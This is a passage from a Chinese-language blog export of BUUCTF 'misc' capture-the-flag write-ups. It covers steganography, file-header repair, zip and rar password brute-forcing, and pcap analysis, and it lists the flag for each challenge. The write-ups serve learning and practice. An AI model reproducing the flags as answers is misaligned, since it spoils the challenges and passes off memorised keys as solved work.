snakes?`\n百度搜索得到`anaconda`\n\nserpent解密得到flag\n![](/img/buuctf/buu-misc-page2-2.png)\n\n\n>flag{who_knew_serpent_cipher_existed}\n\n\n# [BJDCTF2020]认真你就输了 #\n\n一个xls文件，实际是个压缩包，将后缀改为zip解压\n在`xl\\charts`下得到flag.txt\n\n>flag{M9eVfi2Pcs#‌‌‌‌‍‬}\n\n\n# [BJDCTF2020]藏藏藏 #\n\nforemost分离出一个压缩包，解压得到docx，里面有张二维码，扫码得到flag\n\n\n>flag{you are the best!}\n\n\n\n# 被偷走的文件 #\n\n追踪流可以发现使用ftp的`retr`命令下载了一个`flag.rar`\n\n转成原始数据后另存为\n\n使用`archpr`爆破得到密码`5790`，解压得到flag.txt\n\n>flag{6fe99a5d03fb01f833ec3caa80358fa3}\n\n\n# [GXYCTF2019]佛系青年 #\n\n伪加密，得到`佛曰：遮等諳勝能礙皤藐哆娑梵迦侄羅哆迦梵者梵楞蘇涅侄室實真缽朋能。奢怛俱道怯都諳怖梵尼怯一罰心缽謹缽薩苦奢夢怯帝梵遠朋陀諳陀穆諳所呐知涅侄以薩怯想夷奢醯數羅怯諸`\n\n佛曰解密得到flag\n\n>flag{w0_fo_ci_Be1}\n\n\n# [BJDCTF2020]你猜我是个啥 #\n\n下载得到一个zip，但是实际上是一个png\n\n改成png后打开得到一个二维码，扫码得到`flag祥婓涴`,是假的flag，真的在png文件尾\n\n>flag{i_am_fl@g}\n\n\n# 菜刀666 #\n\nhttp流量分析\n先在z2参数中提取出一张jpg，得到密码：`Th1s_1s_p4sswd_!!!`\n再从上传的数据包中提取出一个zip\n解压得到flag\n\n>flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}\n\n\n# 秘密文件 #\n\n与`被偷走的文件`这题步骤一致\n\n>flag{d72e5a671aa50fa5f400e5d10eedeaa5}\n\n\n# 梅花香之苦寒来 #\n\n图片尾发现一串十六进制字符，转成ascii码，发现全是(x,x)的形式\n猜测为坐标，使用`gnuplot`画图\n\n注意坐标的格式为`x[空格]x`\n![](/img/buuctf/buu-misc-page2-3.png)\n\n扫码得到flag\n\n>flag{40fc0a979f759c8892f4dc045e28b820}\n\n\n# [BJDCTF2020]just_a_rar #\n四位数暴力破解，口令`2016`\n解压得到一张jpg，在属性中得到flag\n\n\n>flag{Wadf_123}\n\n\n# [BJDCTF2020]鸡你太美 #\n\n解压后得到两个gif文件，一个gif文件头被修改了\n修复后可以直接看到flag了\n注意不是短杠是下划线\n\n\n>flag{zhi_yin_you_are_beautiful}\n\n# [BJDCTF2020]一叶障目 #\n修改高度\n\n>flag{66666}\n\n\n\n# [SWPU2019]神奇的二维码 #\n\nbinwalk分离出四个压缩包,有俩个无用的干扰项\n在其中一个doc中得到解压密码`comEON_YOuAreSOSoS0great`\n解压后是一个`good.mp3`，`audacity`分析发现摩斯\n\n`-- --- .-. ... . .. ... ...- . .-. -.-- ...- . .-. -.-- . .- ... -.--`\n\n>flag{morseisveryveryeasy}\n\n\n# [BJDCTF2020]纳尼 #\n修复文件头，再将每一帧分离出图片，拼接字符串后base64解密得到flag\n\n>flag{wang_bao_qiang_is_sad}\n\n\n# 穿越时空的思念 #\n还是摩斯\n\n第一段：`F029BD6F551139EEDEB8E45A175B0786`\n第二段：`F029BD6F5`\n\n>flag{f029bd6f551139eedeb8e45a175b0786}\n\n\n# [ACTF新生赛2020]outguess #\noutguess隐写\n密码在图片属性中\n`outguess -r mmm.jpg -t asd -k abc`\n\n>flag{gue33_Gu3Ss!2020}\n\n\n# [HBNIS2018]excel破解 #\n看似爆破，实际string\n\n>flag{office_easy_cracked}\n\n\n# 谁赢了比赛？ #\nbinwalk分解出一个rar\n暴力破解出密码`1020`\n将的得到的gif放在stegsolve分析\n在第310帧处发现不一样的图片,另存为\n再将这个图片进行lsb隐写分析\n在r0通道发现一张二维码\n扫码得到flag\n\n>flag{shanxiajingwu_won_the_game}\n\n# [SWPU2019]我有一只马里奥 #\n运行exe后生成了一段txt文本\n\n```text\nntfs\nflag.txt\n```\n\n很明显是ntfs流\n\n使用`ntfsstreamseditor`处理\n\n![](/img/buuctf/buu-misc-page2-4.png)\n\n\n也可以使用notepad命令来打开隐藏的文件\n`notepad 1.txt:flag.txt`\n\n![](/img/buuctf/buu-misc-page2-5.png)\n\n>flag{ddg_is_cute}\n\n\n# [HBNIS2018]来题中等的吧 #\n\n摩斯`.- .-.. .--. .... .- .-.. .- -...`\n\n>flag{alphalab}\n\n\n\n# [GXYCTF2019]gakki #\n\nbinwalk分离出一个带密码的rar\n爆破出密码为`8864`\n\n观察字符串的特征，不像各种编码，尝试词频分析\n\n```python\n#python2\nfrom collections import Counter\n\n\nf=open('file.txt','r')\nf_read=f.read()\n\n\nprint Counter(f_read)\na=sorted(Counter(f_read).items(),key=lambda d:d[1],reverse=1)\nprint ''.join([i[0] for i in a])\n```\n![](/img/buuctf/buu-misc-page2-6.png)\n\n>flag{gaki_IsMyw1fe}\n\n\n# [WUSTCTF2020]find_me #\n图片属性备注中有盲文\n解密得到flag\n\n>flag{y\\$0\\$u_f\\$1\\$n\\$d\\$_M\\$e\\$e\\$e\\$e\\$e}\n\n\n\n# [ACTF新生赛2020]base64隐写 #\nbase64隐写\n\n```python\n# -*- coding: utf-8 -*-\n#base64解码脚本，Python2 运行\n\nb64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n\n# 2.txt为需要解码的文件\nwith open('2.txt', 'rb') as f:\n    bin_str = ''\n    for line in f.readlines():\n        stegb64 = ''.join(line.split())\n        rowb64 =  ''.join(stegb64.decode('base64').encode('base64').split())\n        offset = abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=','')[-1]))\n        equalnum = stegb64.count('=') #no equalnum no offset\n        if equalnum:\n            bin_str += bin(offset)[2:].zfill(equalnum * 2)\n        print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) #8位一组\n```\n\n\n>flag{6aseb4_f33!}\n\n\n# [SWPU2019]伟大的侦探 #\n\n修改txt中内容的编码为`EBCDIC`\n得到密码`wllm_is_the_best_team!`\n\n对着跳舞小人密码表解密得到flag\n\n>flag{iloveholmesandwllm}\n\n\n# [GUET-CTF2019]KO #\n\nook编码\n\n>flag{welcome to CTF}\n\n\n# 黑客帝国 #\n开头是`52 61 72 21 1a 07 00`，是rar的文件头，保存为rar\n暴力破解得到密码`3690`\n\n解压得到一个后缀为png的文件，但是在十六进制下观察可以发现实际上是jpg文件，头前四个字节被修改成`89 50 4e 47`了。改成`ff d8 ff e0`即可\n\nflag在修好后的图片上\n\n>flag{57cd4cfd4e07505b98048ca106132125}\n\n\n\n# [MRCTF2020]ezmisc #\n\n修改高度\n\n>flag{1ts_vEryyyyyy_ez!}\n\n\n# [MRCTF2020]你能看懂音符吗 #\n文件头被改，修改回正确的`52 61 72`\n解压得到一个docx，改后缀为zip并解压\n\n在`document.xml`中得到字符串`♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=`\n\n音符解码得到flag\n\n>flag{thEse_n0tes_ArE_am@zing~}\n\n\n# sqltest #\nsql注入的流量\n\n先用tshark把注入流量导出来\n\n`tshark -r sqltest.pcapng -Y \"http.request\" -T fields -e http.request.full_uri > data.txt`\n\n>-r 读取文件\n>-Y 过滤语句\n>-T pdml|ps|text|fields|psml,设置解码结果输出的格式\n>-e 输出特定字段\n>http.request.uri http请求的uri部分\n\n\n提取字段的ascii值，再把ascii转成字符串\n\n>102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125\n\n>flag{47edb8300ed5f9b28fc54b0d09ecdef7}\n\n\n# [HBNIS2018]低个头 #\n\n键盘密码，在键盘上画出来即可\n\n>flag{CTF}\n","tags":["misc","buuctf"],"categories":["wp"]},{"title":"【buuctf】misc-page1","url":"/posts/8d0c1d82/","content":"\n\n# 签到 #\n\n>flag{buu_ctf}\n\n# 金三胖 #\ngif文件，使用`stegsolve`逐帧查看，分别在第21，51，79帧出现了三段flag，拼接起来\n>flag{he11ohongke}\n\n# 二维码 #\n解压得到一张二维码，解码得到`secret is here`\n十六进制形式下观察发现`50 4b 03 04`，即压缩包的头\n![](/img/buuctf/buu-misc-page1-1.png)\n\n可以将后缀直接改为zip解压，这样可以不用先分离文件\n打开后发现需要密码，而压缩包中的文件名为`4number.txt`，这样就很明显了，是4位数字爆破\n\n使用`archpr`爆破得到密码`7639`\n\n>flag{vjpw_wnoei}\n\n# 你竟然赶我走 #\n在文件尾直接得到flag\n\n>flag{stego_is_s0_bor1ing}\n\n\n\n# N种方法解决 #\n解压得到一个`KEY.exe`，以文本形式查看，可以看到实际上是一个base64后的图片\n解码后得到一张二维码，扫码得到\n\n>flag{dca57f966e4e4e31fd5b15417da63269}\n\n# 大白 #\n图片放入`010 editor`会报`IHDR块CRC`错误，大概率是高宽被修改了\n\n修改成较大的值\n![](/img/buuctf/buu-misc-page1-2.png)\n\n>flag{He1l0_d4_ba1}\n\n\n\n# 基础破解 #\n根据提示进行四位数字暴力破解，得到密码`2563`\n解压后对内容base64解码\n\n>flag{70354300a5100ba78068805661b93a5c}\n\n\n\n# 乌镇峰会种图 #\n文件尾\n\n>flag{97314e7864a8f62627b26f3f998c37f1}\n\n\n\n\n# 文件中的秘密 #\n右键查看属性，flag在备注中\n\n>flag{870c5a72806115cb5439345d8b014396}\n\n\n# wireshark #\n流量分析题\n根据提示找到管理员的密码\n\n使用`wireshark`打开，因为是登陆网站的一段流量包，所以在过滤器中搜索http，然后找到登录的`user.php`，找到密码\n![](/img/buuctf/buu-misc-page1-3.png)\n\n>flag{ffb7567a1d4f4abdffdb54e022f8facd}\n\n\n# LSB #\n题目名为`LSB`，应为LSB隐写\n\n用`stegsolve`打开，在`red，Green，Blue`的`0`通道中发发现一张png的数据\n![](/img/buuctf/buu-misc-page1-4.png)\n\n导出后是一张二维码，扫码得到flag\n\n>flag{1sb_i4_s0_Ea4y}\n\n# rar #\n又是4位数字爆破，`8795`\n\n>flag{1773c5da790bd3caff38e3decd180eb7}\n\n\n# zip伪加密 #\n如题，修改压缩文件区的加密标志位，改为`00`\n![](/img/buuctf/buu-misc-page1-5.png)\n\n\n>flag{Adm1N-B2G-kU-SZIP}\n\n\n# qr #\n\n扫码得到flag\n\n>flag{878865ce73370a4ce607d21ca01b5e59}\n\n\n# 被嗅探的流量 #\n追踪TCP数据流，发现上传了一张`flag.jpg`，在图片数据尾发现flag\n\n>flag{da73d88936010da1eeeb36e945ec4b97}\n\n\n# 镜子里面的世界 #\n\n`stegsolve`发现`0`通道中有异常数据，提取出来发现一串字符串`Hey I think we can write  safely in this  file without any one seeing it. Any way, the secret key is: st3g0_saurus_wr3cks`\n\n\n>flag{st3g0_saurus_wr3cks}\n\n\n\n# ningen #\n`foremost`分离出一个zip，根据提示进行四位数爆破，`8368`\n\n>flag{b025fc9ca797a67d2103bfbc407a6d5f}\n\n\n\n# 小明的保险箱 #\n`foremost`分离出一个rar，根据提示进行四位数爆破，`7869`\n\n>flag{75a3d68bf071ee188c418ea6cf0bb043}\n\n\n# 爱因斯坦 #\n`foremost`分离出一个zip，密码在图片属性中`this_is_not_password`\n\n>flag{dd22a92bf2cceb6c0cd0d6b83ff51606}\n\n\n\n# easycap #\n追踪TCP流\n\n>flag{385b87afc8671dee07550290d16a8071}\n\n# 隐藏的钥匙 #\n`strings`得到`flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=)`\n\n>flag{377cbadda1eca2f2f73d36277781f00a}\n\n\n# 另外一个世界 #\n将文件尾的`01101011 01101111 01100101 01101011 01101010 00110011 01110011`转成字符串\n\n>flag{koekj3s}\n\n# FLAG #\n使用`stegsolve`在`0`通道中发现`zip`数据\n提取后会发现提示文件已损坏，将结尾处没用的数据删除就可以了\n解压得到一个`ELF`文件，运行得到flag\n\n>flag{dd0gf4c3tok3yb0ard4g41n~~~}\n\n\n\n# 假如给我三天光明 #\n图片下有盲文，百度找个盲文表对一下，得到`kmdonowg`\n使用`audacity`分析音频，发现摩斯`-.-. - ..-. .-- .--. . .. ----- ---.. --... ...-- ..--- ..--.. ..--- ...-- -.. --..`\n\n解摩斯得到flag\n\n\n>flag{wpei08732?23dz}\n\n\n# 神秘龙卷风 #\n四位数字爆破，`5463`\n得到一串`brainfuck`字符串\n解码得到flag\n\n>flag{e4bbef8bdf9743f8bf5b727a9f6332a8}\n\n\n# 后门查杀 #\n用河马查杀，D盾或者手动查看\n找到`include\\include.php`\n\n>flag{6ac45fb83b3bc355c024f5034b947dd3}\n\n\n\n# 数据包中的线索 #\n过滤器筛选`HTTP`包，发现一段base64加密后的数据，解密后是一张jpg\n\n\n>flag{209acebf6324a09671abc31c869de72c}\n\n\n# 荷兰宽带数据泄露 #\n路由器配置文件\n使用`RouterPassView`打开，搜索`useranme`\n\n>flag{053700357621}\n\n# 来首歌吧 #\n`audacity`分析音频，发现左声道有摩斯\n\n`..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.\n`\n\n>flag{5BC925649CB0188F52E617D70929191C}\n\n# webshell后门 #\n`D盾`查杀，发现`member\\zp.php`\n\n>flag{ba8e6c6f35a53933b871480bb9a9545c}\n\n# 面具下的flag #\n`foremost`分离出一个zip，伪加密，将加密标志位改为`00`，得到一个`vmdk`文件，但是这个文件很小，只有`3MB`，所以不太可能需要挂载\n\nkail下使用7z解压`7z x flag.vmdk -o/root/flag`，得到`key_part_one`和`key_part_two`\n\n分别进行`brainfuck`和`ook`解码\n\n\n>flag{N7F5_AD5_i5_funny!}\n\n\n\n# 九连环  #\n`foremost`分离出一个zip，伪加密，将加密标志位改为`00`，得到一张jpg，使用`steghide`空密码解密，得到密码`bV1g6t5wZDJif^J7`，解压压缩包得到flag\n\n\n>flag{1RTo8w@&4nK@z*XL}\n\n\n","tags":["misc","buuctf"],"categories":["wp"]}]